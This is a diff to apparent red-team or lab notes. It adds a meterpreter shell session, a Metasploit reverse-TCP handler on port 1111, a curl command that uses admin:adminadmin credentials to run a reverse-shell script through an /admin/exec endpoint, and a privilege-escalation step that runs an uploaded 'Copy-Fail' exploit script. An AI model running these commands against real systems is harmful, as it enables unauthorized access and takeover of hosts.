@@ -1721,10 +1721,7 @@ tasking:
   command: collect-system-profile
   status: queued
 ```
-
-
-
-ss -tulpan
+##### ss -tulpan
 ```
 meterpreter > shell
 Process 6154 created.
@@ -1761,5 +1758,9 @@ tcp   LISTEN    0      128             [::]:2222          [::]:*
 - secondary
 	- reverse tcp shell
 		- msfconsole
-msf > handler -p linux/x64/meterpreter/reverse_tcp -H 0.0.0.0 -P 1111
-			- setup handler using the 
+			- setup handler using the linux/x64/meterpreter/reverse_tcp payload listining on 0.0.0.0:1111
+		- curl
+			- curl -u admin:adminadmin http://20.30.40.150:8080/admin/exec?cmd='bash%20-c%20/home/foothold/rev
+- Escalate privileges using the uploaded Copy-Fail exploit
+	- python3 /home/foothold/cf2.py
+	
